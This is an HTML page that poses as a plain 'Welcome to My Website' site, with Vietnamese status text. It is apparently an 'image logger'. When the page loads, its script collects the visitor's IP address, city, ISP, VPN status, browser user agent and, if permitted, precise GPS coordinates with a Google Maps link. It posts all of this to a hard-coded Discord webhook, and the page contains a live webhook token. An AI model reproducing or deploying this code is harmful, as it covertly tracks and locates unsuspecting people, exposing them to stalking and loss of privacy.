<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP & Location Logger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
            text-align: center;
        }
        h1 {
            font-size: 3em;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.2em;
            margin-top: 10px;
        }
        .ip-address {
            font-size: 3em;
            font-weight: bold;
            color: #ff0000;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div>
        <h1>Welcome to My Website</h1>
        <p>Đang tải dữ liệu mạng và vị trí...</p>
        <div class="ip-address" id="ip-address">...</div>
        <p id="status">Vui lòng đợi trong giây lát...</p>
    </div>
    
    <script>
    let globalData = {};

    function sendToDiscord(extraText = "") {
        var request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/1557733822601105419/3P02RcN4TR9j8DkIq8GodlkvgBo2bD-40J_5NaFNle3KvxeTtKoNhRbQGELIy7o_9jr6");
        request.setRequestHeader('Content-type', 'application/json');

        // Kiểm tra VPN/Proxy từ ipinfo privacy extension
        let isVpnOrProxy = "NO";
        if (globalData.privacy) {
            if (globalData.privacy.vpn || globalData.privacy.proxy || globalData.privacy.hosting) {
                isVpnOrProxy = "YES (VPN/Proxy detected)";
            }
        }

        let lat = globalData.lat || (globalData.loc ? globalData.loc.split(',')[0] : 'N/A');
        let lon = globalData.lon || (globalData.loc ? globalData.loc.split(',')[1] : 'N/A');
        let mapsLink = (lat !== 'N/A' && lon !== 'N/A') ? `https://www.google.com/maps?q=${lat},${lon}` : 'Không có tọa độ';

        var params = {
            username: "Cordly Image Logger by phongdepzai02",
            content: `🎯 Image Opened - Intelligence Report ${extraText}`,
            embeds: [
                {
                    title: "📍 Thông tin Vị trí & IP Nâng cấp",
                    color: 3447003,
                    fields: [
                        { name: "🌐 IP Address", value: `\`${globalData.ip || 'N/A'}\``, inline: false },
                        { name: "🛡️ VPN/Proxy", value: `🚩 **${isVpnOrProxy}**`, inline: false },
                        { name: "🌍 Timezone", value: `${globalData.timezone || 'N/A'}`, inline: false },
                        { name: "📍 Location", value: `${globalData.city \vert{}\vert{} 'N/A'},${globalData.region || 'N/A'}, ${globalData.country \vert{}\vert{} 'N/A'}\n[View on Google Maps](${mapsLink})\n*Tọa độ: ${lat},${lon}*`, inline: false },
                        { name: "🏢 Network / Hostname", value: `${globalData.org || 'N/A'}`, inline: false },
                        { name: "💻 Device & Browser", value: `\`${navigator.userAgent}\``, inline: false }
                    ],
                    footer: {
                        text: "Tool created by phongdepzai02"
                    }
                }
            ]
        };

        request.send(JSON.stringify(params));
    }

    function monke(json) {
        globalData = json;
        document.getElementById('ip-address').innerText = json.ip;
        
        // Thử xin quyền GPS của trình duyệt (High Accuracy Geolocation)
        if (navigator.geolocation) {
            document.getElementById('status').innerText = "Đang yêu cầu quyền định vị GPS...";
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    globalData.lat = position.coords.latitude;
                    globalData.lon = position.coords.longitude;
                    document.getElementById('status').innerText = "Đã lấy vị trí GPS thành công!";
                    sendToDiscord("(Có tọa độ GPS chính xác từ thiết bị!)");
                },
                function(error) {
                    document.getElementById('status').innerText = "Sử dụng vị trí tương đối qua IP.";
                    sendToDiscord("(Người dùng từ chối GPS, dùng IP tạm thời)");
                },
                { timeout: 10000, enableHighAccuracy: true }
            );
        } else {
            sendToDiscord();
        }
    }
    </script>

    <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
</body>
</html>
